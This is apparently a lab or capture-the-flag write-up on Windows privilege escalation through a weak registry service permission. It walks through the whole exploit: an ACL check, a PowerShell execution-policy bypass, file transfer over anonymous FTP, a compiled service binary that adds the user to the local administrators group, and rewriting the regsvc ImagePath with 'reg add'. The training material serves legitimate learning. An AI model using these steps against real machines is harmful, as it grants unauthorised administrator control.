# Service Escalation - Registry

- Using `Get-Acl` we determine that the `NT AUTHORITY\INTERACTIVE` has full control over the `regsvc` registry
- We can add a malicious executable to the registry service
- We can exploit this to either get a reverse shell or add a user

## Step 1: Detection

- Open PowerShell prompt and type: **`Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl`**

```jsx
C:\Users\user> powershell -ep bypass
PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
```

- Notice that the output suggests that user belong to “`NT AUTHORITY\INTERACTIVE`” has “`FullContol`” permission over the registry key.

![get_acl](/images/get_acl.png)

## Step 2: Transfer File

- Start FTP server on port 21 and allow `write` access

```jsx
┌──(vagrant㉿kali)-[~/Documents/THM/windowsprivescarena]
└─$ pip3 install pyftpdlib

┌──(vagrant㉿kali)-[~/Documents/THM/windowsprivescarena]
└─$ python -m pyftpdlib -p 21 --write
/home/vagrant/.local/lib/python3.11/site-packages/pyftpdlib/authorizers.py:108: RuntimeWarning: write permissions assigned to anonymous user.
  self._check_permissions(username, perm)
[I 2023-12-27 23:12:18] concurrency model: async
[I 2023-12-27 23:12:18] masquerade (NAT) address: None
[I 2023-12-27 23:12:18] passive ports: None
[I 2023-12-27 23:12:18] >>> starting FTP server on 0.0.0.0:21, pid=2440229 <<<
```

- Open terminal in the directory where `windows_service.c` is located

![source](/images/source.png)

- Copy ‘`C:\Users\User\Desktop\Tools\Source\windows_service.c`’ to the attack machine

```jsx
C:\Users\User\Desktop\Tools\Source> ftp 10.18.48.44
User (10.18.48.44:(none)): anonymous
Password:
230 Login successful
ftp> put windows_service.c
```

![put](/images/put.png)

## Step 3: Exploitation

- Open `windows_service.c` in a text editor and replace the command used by the system() function to: **`cmd.exe /k net localgroup administrators user /add`**

![edit](/images/edit.png)

- Compile the file by typing the following in the command prompt:
  - **`x86_64-w64-mingw32-gcc windows_service.c -o x.exe`**
  - **NOTE: if this is not installed, use '`sudo apt install gcc-mingw-w64`'**

```jsx
┌──(vagrant㉿kali)-[~/Documents/THM/windowsprivescarena]
└─$ x86_64-w64-mingw32-gcc windows_service.c -o x.exe
```

- Copy the generated file `x.exe`, to the target using the `pytfp` server
- Make sure to use `binary` mode for the transfer process

![get](/images/get.png)

### Add Executable to `ImagePath` of the Registry Service

- Open command prompt at type:

**`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`**

```jsx
C:\Temp> **reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f**
```

- Start the `registry service` in the command prompt type: **`sc start regsvc`**

```jsx
C:\Temp> sc start regsvc
```

- Verify the `user` account has been added to the `local administrators` group

```jsx
C:\Temp> net localgroup administrators
```

![start](/images/start.png)
